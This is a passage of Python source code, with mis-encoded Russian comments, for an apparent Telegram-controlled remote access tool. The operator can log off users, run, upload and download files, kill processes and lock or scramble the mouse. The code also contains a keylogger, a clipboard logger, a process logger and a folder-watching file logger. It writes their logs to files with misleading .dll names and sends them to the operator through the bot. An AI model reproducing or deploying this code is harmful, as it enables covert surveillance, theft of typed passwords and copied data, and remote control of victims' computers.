        elif message.text == "üë®‚Äçüíª –°–º–µ–Ω–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è":
            bot.send_message(my_id, "–°–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è...")
            os.system('tsdiscon')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "‚ö†Ô∏è –í—ã–π—Ç–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã":
            bot.send_message(my_id, "–í—ã—Ö–æ–¥ –∏–∑ —Å–∏—Å—Ç–µ–º—ã...")
            os.system('shutdown -l')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "üíª –û –∫–æ–º–ø—å—é—Ç–µ—Ä–µ":
            bot.send_message(my_id, "–ù–∞—á–∏–Ω–∞—é –ø–æ–∏—Å–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ...\n–ß–µ—Ä–µ–∑ –ø–∞—Ä—É –º–∏–Ω—É—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤–∞.")
            computer_info = get_computer_info()
            send_computer_info(message)
            bot.register_next_step_handler(message, addons_process)  
        elif message.text == "üóÇ dir /b":
            get_directory_listing(message)
        elif message.text == "üì© –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è":
            bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ —Ç–µ–∫—Å—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:")
            bot.register_next_step_handler(message, messaga_process)
        elif message.text == "üîó –ü–µ—Ä–µ–π—Ç–∏ –ø–æ —Å—Å—ã–ª–∫–µ":
            bot.send_message(my_id, "–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞ –∏ —Å—Å—ã–ª–∫—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ: –±—Ä–∞—É–∑–µ—Ä —Å—Å—ã–ª–∫–∞. –ù–∞–ø—Ä–∏–º–µ—Ä: chrome https://example.com. –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã: opera, yandex, chrome, firefox, edge, brave.")
            bot.register_next_step_handler(message, process_link_browser)
        elif message.text == "‚è™ –ù–∞–∑–∞–¥":
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def files_process(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "‚ùå –£–Ω–∏—á—Ç–æ–∂–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å":
            bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ –∑–∞–≤–µ—Ä—à–∏—Ç—å:")
            bot.register_next_step_handler(message, kill_process)
        elif message.text == "üñ• –í—Å–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–º–ø—å—é—Ç–µ—Ä—ã":
            list_registered_computers()
        elif message.text == "‚úÖ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª":
            bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞: ")
            bot.register_next_step_handler(message, start_process)
        elif message.text == "‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞":
            bot.send_message(my_id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ —Ñ–∞–π–ª–∞:")
            bot.register_next_step_handler(message, downfile_process)
        elif message.text == "‚¨ÜÔ∏è –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä":
            bot.send_message(my_id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π —Ñ–∞–π–ª")
            bot.register_next_step_handler(message, uploadfile_process)
        elif message.text == "üîó –ó–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ —Å—Å—ã–ª–∫–µ":
            bot.send_message(message.chat.id, "–£–∫–∞–∂–∏—Ç–µ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª (–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è vk.cc/cqTRtN). –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π –≤–µ—Å —Ñ–∞–π–ª–∞ - 1 –ì–ë")
            bot.register_next_step_handler(message, process_download)
        elif message.text == "üìã –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤":
            send_process_list(message)
        elif message.text == "‚è™ –ù–∞–∑–∞–¥":
            back(message)
        else:
            info_user(message)
            
            
            
#–æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –º—ã—à–∏
@bot.message_handler(func=lambda message: True)
def mouse_process(message):
    global mouse_locked
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º—ã—à—å":
            mouse_locked = True
            threading.Thread(target=lock_mouse).start()
            bot.send_message(my_id, "–ú—ã—à—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞")
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "‚úÖ –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º—ã—à—å":
            mouse_locked = False
            bot.send_message(my_id, "–ú—ã—à—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞")
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "üí• –†–∞–Ω–¥–æ–º –∫—É—Ä—Å–æ—Ä":
            start_random_mouse(message)
        elif message.text == "‚è™ –ù–∞–∑–∞–¥":
            back(message)
        else:
            info_user(message)
#####################################################
registered_computers = {} # –í –Ω–∞—á–∞–ª–µ —Å–∫—Ä–∏–ø—Ç–∞ —Å–æ–∑–¥–∞–µ–º —Å–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞—Ö
def register_computer(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    computer_name = platform.node()  # –ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    ip_address = socket.gethostbyname(socket.gethostname())  # IP-–∞–¥—Ä–µ—Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    registered_computers[computer_name] = ip_address
def get_registered_computers(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–≤
    return registered_computers
def send_computer_info_bot(): # –í–∞—à–∞ —Ñ—É–Ω–∫—Ü–∏—è send_computer_info_bot() —Ç–µ–ø–µ—Ä—å –±—É–¥–µ—Ç —Ç–∞–∫–æ–π:
    computer_name = platform.node()  # –ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    ip_address = socket.gethostbyname(socket.gethostname())  # IP-–∞–¥—Ä–µ—Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    bot.send_message(my_id, f"–ë–æ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∏—Ä–æ–≤–∞–Ω –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ {computer_name} —Å IP-–∞–¥—Ä–µ—Å–æ–º {ip_address}")
    register_computer()
def list_registered_computers(): # –î–∞–ª–µ–µ, –µ—Å–ª–∏ –≤–∞–º –Ω—É–∂–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞ —Å–ø–∏—Å–∫–∞ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–≤, —Ç–æ –æ–Ω–∞ –±—É–¥–µ—Ç —Ç–∞–∫–æ–π:
    computers = get_registered_computers()
    if computers:
        message = "–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–º–ø—å—é—Ç–µ—Ä—ã:\n"
        for computer, ip in computers.items():
            message += f"{computer} - {ip}\n"
        bot.send_message(my_id, message)
    else:
        bot.send_message(my_id, "–ù–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–≤ –Ω–µ—Ç.")
######################################################
################CLIPBOARDLOGGER [v1.0]################
log_clipboard_path = "tempclip.dll"  # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É –ª–æ–≥–æ–≤ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞
last_clipboard_data = ""
logging_enabled = False  # –§–ª–∞–≥ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è/–≤—ã–∫–ª—é—á–µ–Ω–∏—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
def clear_log_file(file_path): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ —Ñ–∞–π–ª–∞ —Å –ª–æ–≥–∞–º–∏
    try:
        os.remove(file_path)  # –£–¥–∞–ª–∏—Ç—å —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª –ª–æ–≥–æ–≤
    except FileNotFoundError:
        pass
def log_clipboard(log_clipboard_path): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –≤ —Ñ–∞–π–ª –ª–æ–≥–æ–≤
    global last_clipboard_data, logging_enabled
    clear_log_file(log_clipboard_path)  # –û—á–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª —Å –ª–æ–≥–∞–º–∏ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    while logging_enabled:
        clipboard_data = pyperclip.paste().strip()  # –ü–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –∏ —É–¥–∞–ª–∏—Ç—å –ª–∏—à–Ω–∏–µ –ø—Ä–æ–±–µ–ª—ã
        if clipboard_data and clipboard_data != last_clipboard_data:
            if not clipboard_data.isspace():  # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞ –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")  # –ü–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—É—â–µ–µ –≤—Ä–µ–º—è
                formatted_data = f"[{timestamp}]\n{clipboard_data}"  # –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ —Å –≤—Ä–µ–º–µ–Ω–µ–º –∏ []
                with open(log_clipboard_path, "a", encoding='utf-8') as log_file:
                    log_file.write(f"–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞: {formatted_data}\n____________________________\n")
                last_clipboard_data = clipboard_data
        time.sleep(1)  # –ò–Ω—Ç–µ—Ä–≤–∞–ª –ø—Ä–æ–≤–µ—Ä–∫–∏ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
def start_clipboard_logging(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å—Ç–∞—Ä—Ç–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    global logging_enabled
    if not logging_enabled:
        logging_enabled = True
        threading.Thread(target=log_clipboard).start()
def stop_clipboard_logging(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    global logging_enabled
    logging_enabled = False
def clip_send_logs(my_id, log_clipboard_path, bot):
    try:
        with open(log_clipboard_path, 'rb') as log_file:
            bot.send_document(my_id, log_file)
            bot.send_message(my_id, "–õ–æ–≥–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.")
    except Exception as e:
        bot.send_message(my_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {str(e)}.\n–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –∫–ª–∏–ø–ª–æ–≥–≥–µ—Ä.")
#####################################################

#################TASKLOGGER [v1.2]###################
log_task_path = "tempprocess.dll"  # –ù–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –ª–æ–≥–æ–≤
known_processes = set()
lock = threading.Lock()
monitor_thread_process = None 
def is_windows_process(process):
    try:
        return 'Windows' in process.name()
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False
def clear_log_file_process(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ —Ñ–∞–π–ª–∞ –ª–æ–≥–æ–≤
    try:
        os.remove(log_task_path)  # –£–¥–∞–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª –ª–æ–≥–æ–≤
    except FileNotFoundError:
        pass
def monitor_processes(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    global known_processes
    while True:
        with lock:
            current_processes = set([p.name() for p in psutil.process_iter() if not is_windows_process(p)])
            new_processes = current_processes - known_processes
            known_processes.update(new_processes)
        if new_processes:
            with open(log_task_path, "a", encoding='utf-8') as log_file:
                for process_name in new_processes:
                    log_file.write(f"–ù–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–ø—É—â–µ–Ω: {process_name}\n")
        time.sleep(5)  # –ò–Ω—Ç–µ—Ä–≤–∞–ª –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–æ–≤—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
def start_process_logger(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –ª–æ–≥–≥–µ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    global monitor_thread_process
    clear_log_file_process()  # –û—á–∏—â–∞–µ–º —Ñ–∞–π–ª —Å –ª–æ–≥–∞–º–∏ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    monitor_thread_process = threading.Thread(target=monitor_processes)  # –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏—é –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    monitor_thread_process.start()
def stop_process_logger(): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –ª–æ–≥–≥–µ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    global monitor_thread_process
    if monitor_thread_process is not None:
        monitor_thread_process.join()  # –û–∂–∏–¥–∞—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
def task_send_logs(my_id, log_task_path, bot):
    try:
        with open(log_task_path, 'rb') as log_file:
            bot.send_document(my_id, log_file)
            bot.send_message(my_id, "–õ–æ–≥–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.")
    except Exception as e:
        bot.send_message(my_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {str(e)}.\n–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ —Ç–∞—Å–∫–ª–æ–≥–≥–µ—Ä.")
#####################################################


##################FILELOGGER [v1.4]##################
filelogger_active = False
folders_to_monitor_file = [ # –ü–∞–ø–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å
    os.path.expanduser("~\Downloads"),
    os.path.expanduser("~\Desktop"),
    os.path.expanduser("~\Pictures"),
    os.path.expanduser("~\Music"),
    os.path.expanduser("~\Videos"),
    os.path.expanduser("~\Documents")
]
log_file_path = "temp1.dll" # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä–∞
last_check_time = time.time() # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –ø—Ä–æ–≤–µ—Ä–∫–∏
def monitor_folders(): #–§—É–Ω–∫—Ü–∏—è —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä–∞
    global last_check_time
    while True:
        for folder in folders_to_monitor_file:
            for filename in os.listdir(folder):
                file_path = os.path.join(folder, filename)
                if os.path.isfile(file_path) and os.path.getctime(file_path) > last_check_time: # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç–ª–µ–º–µ–Ω—Ç —Ñ–∞–π–ª–æ–º –∏ –Ω–æ–≤—ã–º
                    with open(log_file_path, "a") as log_file:
                        log_file.write(f"–ù–∞–π–¥–µ–Ω –Ω–æ–≤—ã–π —Ñ–∞–π–ª: {file_path}\n") # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –Ω–æ–≤–æ–º —Ñ–∞–π–ª–µ –≤ –∂—É—Ä–Ω–∞–ª
                    bot.send_message(my_id, f"[FILELOGGER]\n–ù–∞–π–¥–µ–Ω –Ω–æ–≤—ã–π —Ñ–∞–π–ª: {file_path}") # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–∞–π–¥–µ–Ω–Ω–æ–º —Ñ–∞–π–ª–µ
        last_check_time = time.time() # –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –ø—Ä–æ–≤–µ—Ä–∫–∏
        time.sleep(2) # –ü–∞—É–∑–∞ –º–µ–∂–¥—É –ø—Ä–æ–≤–µ—Ä–∫–∞–º–∏ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
def activate_filelogger():
    global filelogger_active
    if not filelogger_active:
        filelogger_active = True
        threading.Thread(target=monitor_folders).start()
def deactivate_filelogger():
    global filelogger_active
    filelogger_active = False
def file_send_logs(my_id, log_file_path, bot):
    try:
        with open(log_file_path, 'rb') as log_file:
            bot.send_document(my_id, log_file)
            bot.send_message(my_id, "–õ–æ–≥–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.")
    except Exception as e:
        bot.send_message(my_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {str(e)}.\n–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ —Ñ–∞–π–ª–ª–æ–≥–≥–µ—Ä.")  
#####################################################

###################KEYLOGGER [v1.0]##################
class KeyLogger():
    def __init__(self, filename: str = "temp2.dll") -> None:
        self.filename = filename
        self.bracket_count = 0  # –°—á–µ—Ç—á–∏–∫ –ø–∞—Ä –≤ –∫–≤–∞–¥—Ä–∞—Ç–Ω—ã—Ö —Å–∫–æ–±–∫–∞—Ö
        self.last_log_time = None
    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)
    def on_press(self, key):
        char = self.get_char(key)
        with open(self.filename, 'a') as logs:
            current_time = time.time() # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤—Ä–µ–º—è —Å –º–æ–º–µ–Ω—Ç–∞ –ø–æ—Å–ª–µ–¥–Ω–µ–π –∑–∞–ø–∏—Å–∏
            if self.last_log_time is None or (current_time - self.last_log_time) > 60:
                logs.write(f"\n[–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞—á–∞–ª–æ—Å—å {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
                self.last_log_time = current_time
            logs.write(f"[{char}]")
            self.bracket_count += 1
            if self.bracket_count >= 100:
                logs.write('\n')
                self.bracket_count = 0
                self.last_log_time = current_time
    def run(self):
        try: # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ —É–∂–µ —Ñ–∞–π–ª –ª–æ–≥–æ–≤, –∏ –µ—Å–ª–∏ –¥–∞, —É–¥–∞–ª—è–µ–º –µ–≥–æ
            open(self.filename, 'r')
            os.remove(self.filename)
        except FileNotFoundError:
            pass
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()
        listener.join()
#####################################################

##################TASKKILLER [v1.0]##################
scan_processes = []  # –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
def check_processes(message=None): #–§—É–Ω–∫—Ü–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    global scan_processes
    while True:
        for process_name in scan_processes:
            for process in psutil.process_iter(attrs=['pid', 'name']):
                if process.info['name'] == process_name:
                    try:
                        p = psutil.Process(process.info['pid'])
                        p.terminate()
                        if message:
                            bot.send_message(message.chat.id, f"[TASKKILLER]\n\n–ü—Ä–æ—Ü–µ—Å—Å {process_name} –±—ã–ª –Ω–∞–π–¥–µ–Ω –∏ –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω.")
                    except psutil.NoSuchProcess:
                        pass
        time.sleep(15)
process_thread = threading.Thread(target=check_processes)
def start_scan_processes(message=None): #–°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    global process_thread
    if not process_thread.is_alive():
        process_thread = threading.Thread(target=check_processes, args=(message,))
        process_thread.start()
        if message:
            bot.send_message(message.chat.id, f"[TASKKILLER]\n\n–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ –¥–ª—è —Å–ª–µ–¥—É—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {', '.join(scan_processes)}")
            bot.register_next_step_handler(message, files_process)
def stop_scan_processes(message=None): #–†–∞–∑—Ä–µ—à–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã
    global process_thread
    process_thread.join()
    if message:
        bot.send_message(message.chat.id, "[TASKKILLER]\n\n–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ.")
        bot.register_next_step_handler(message, files_process)
def add_process_to_track(message, process_name): #–ó–∞–ø—Ä–µ—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å
    global scan_processes
    scan_processes.append(process_name)
    if message:
        bot.send_message(message.chat.id, f"[TASKKILLER]\n\n–ü—Ä–æ—Ü–µ—Å—Å {process_name} –¥–æ–±–∞–≤–ª–µ–Ω –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è. –¢–µ–∫—É—â–∏–µ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã: {', '.join(scan_processes)}")
        bot.register_next_step_handler(message, files_process)
def remove_process_to_track(message, process_name): #–†–∞–∑—Ä–µ—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å
    global scan_processes
    if process_name in scan_processes:
        scan_processes.remove(process_name)
        bot.send_message(message.chat.id, f"[TASKKILLER]\n\n–ü—Ä–æ—Ü–µ—Å—Å {process_name} —É–¥–∞–ª–µ–Ω –∏–∑ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è. –¢–µ–∫—É—â–∏–µ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã: {', '.join(scan_processes)}")
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(message.chat.id, f"[TASKKILLER]\n\n–ü—Ä–æ—Ü–µ—Å—Å {process_name} –Ω–µ –±—ã–ª –≤ —Å–ø–∏—Å–∫–µ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—ã—Ö.")
        bot.register_next_step_handler(message, files_process)
def ask_for_process_name(message): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ –ø—Ä–æ—Ü–µ—Å—Å–µ
    bot.send_message(message.chat.id, "[TASKKILLER]\n\n–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è:")
    bot.register_next_step_handler(message, process_name_input)
def process_name_input(message): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –Ω–∞–∑–≤–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞
    process_name = message.text.strip()
    if process_name:
        add_process_to_track(message, process_name)
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(message.chat.id, "[TASKKILLER]\n\n–ù–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.")
        bot.register_next_step_handler(message, files_process)
def ask_for_process_removal(message): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ–± —É–¥–∞–ª–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
    bot.send_message(message.chat.id, "[TASKKILLER]\n\n–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è:")
    bot.register_next_step_handler(message, process_removal_input)
